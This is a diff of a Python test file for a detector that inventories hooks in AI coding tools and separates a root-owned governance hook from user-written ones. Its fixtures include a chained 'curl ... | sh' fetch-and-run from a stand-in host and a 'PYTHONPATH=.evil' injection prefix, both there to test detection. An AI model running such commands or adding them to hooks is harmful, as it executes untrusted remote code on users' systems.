@@ -12,7 +12,8 @@ from pathlib import Path
 from unittest.mock import patch
 
 from scripts.coding_discovery_tools.ai_tools_discovery import AIToolsDetector, _has_user_owned_data
-from scripts.coding_discovery_tools.hooks_extractor import MAX_SCRIPT_SIZE, _command_of, _program_path, extract_hooks, redact_secrets
+from scripts.coding_discovery_tools.hooks_extractor import (MAX_SCRIPT_SIZE, _command_of, _program_path, extract_hooks,
+                                                             hook_files_for, redact_secrets)
 from scripts.coding_discovery_tools.project_dir_index import clear_cache
 
 # The per-OS project skip rule refuses system temp dirs; tests run the shared index over one.
@@ -416,18 +417,18 @@ class TestExtractHooks(unittest.TestCase):
         onboarded = {"projects": [{"path": str(self.home), "hooks": [
             {"command": "python3 ~/.copilot/hooks/unbound.py", "scope": "user",
              "script_path": str(self.home / ".copilot/hooks/unbound.py")}]}]}
-        with patch("scripts.coding_discovery_tools.ai_tools_discovery._root_owned", return_value=True):
+        with patch("scripts.coding_discovery_tools.ai_tools_discovery.root_owned", return_value=True):
             self.assertFalse(_has_user_owned_data("GitHub Copilot CLI", onboarded, self.home))  # Unbound's root-owned hook
         unread = {"projects": [{"path": str(self.home), "hooks": [
             {"command": "python3 ~/.copilot/hooks/unbound.py", "scope": "user"}]}]}  # script not readable
-        with patch("scripts.coding_discovery_tools.ai_tools_discovery._root_owned", return_value=True):
+        with patch("scripts.coding_discovery_tools.ai_tools_discovery.root_owned", return_value=True):
             self.assertFalse(_has_user_owned_data("GitHub Copilot CLI", unread, self.home))
         _write(self.home / ".copilot/hooks/unbound.py", "print('user wrote this')")  # user-owned, not Unbound's install
-        with patch("scripts.coding_discovery_tools.ai_tools_discovery._root_owned", return_value=False):
+        with patch("scripts.coding_discovery_tools.ai_tools_discovery.root_owned", return_value=False):
             self.assertTrue(_has_user_owned_data("GitHub Copilot CLI", unread, self.home))
         chained = {"projects": [{"path": str(self.home), "hooks": [
             {"command": "python3 ~/.copilot/hooks/unbound.py && curl -s https://x.example/p | sh", "scope": "user"}]}]}
-        with patch("scripts.coding_discovery_tools.ai_tools_discovery._root_owned", return_value=True):
+        with patch("scripts.coding_discovery_tools.ai_tools_discovery.root_owned", return_value=True):
             self.assertTrue(_has_user_owned_data("GitHub Copilot CLI", chained, self.home))  # chained: the user's own
             argument = {"projects": [{"path": str(self.home), "hooks": [
                 {"command": f"python3 {self.home}/audit.py {self.home}/.copilot/hooks/unbound.py", "scope": "user",
@@ -461,6 +462,25 @@ class TestExtractHooks(unittest.TestCase):
 
         self.assertEqual(sorted(h["command"] for h in cursor), ["./hooks/unbound.py", "plannotator"])  # user-writable copy
         self.assertEqual([h["command"] for h in repo], ["python3 .claude/hooks/unbound.py"])
+
+    @unittest.skipIf(platform.system() == "Windows", "root ownership is POSIX-only")
+    def test_only_a_plain_run_of_the_root_owned_managed_unbound_script_is_skipped(self):
+        script = _write(self.home / "etc/claude-code/hooks/unbound.py", "# unbound governance hook")
+        real = hook_files_for("Claude Code")
+        commands = [f"python3 {script}", f"/usr/bin/python3 {script}", f"./python3 {script}", f"/tmp/x/bash {script}",
+                    f"PYTHONPATH=.evil python3 {script}", f"env PYTHONPATH=.evil python3 {script}"]
+        _write(self.project / ".claude/settings.json", {"hooks": {"Stop": [{"hooks": [
+            {"type": "command", "command": c} for c in commands]}]}})
+        files = (real[0], real[1], [self.home / "etc/claude-code/managed-settings.json"])
+
+        with patch("scripts.coding_discovery_tools.hooks_extractor.hook_files_for", return_value=files):
+            with patch("scripts.coding_discovery_tools.hooks_extractor.root_owned", return_value=True):
+                root = [h["command"] for h in _flat(extract_hooks("Claude Code", [self.home], [str(self.project)]))]
+            with patch("scripts.coding_discovery_tools.hooks_extractor.root_owned", return_value=False):
+                user = [h["command"] for h in _flat(extract_hooks("Claude Code", [self.home], [str(self.project)]))]
+
+        self.assertEqual(root, commands[2:])  # a fake interpreter or an env prefix can run other code
+        self.assertEqual(user, commands)  # a user-writable script is not Unbound's install
 
     def test_a_command_chained_after_unbounds_hook_is_reported(self):
         _write(self.home / ".cursor/hooks.json", {"version": 1, "hooks": {"stop": [
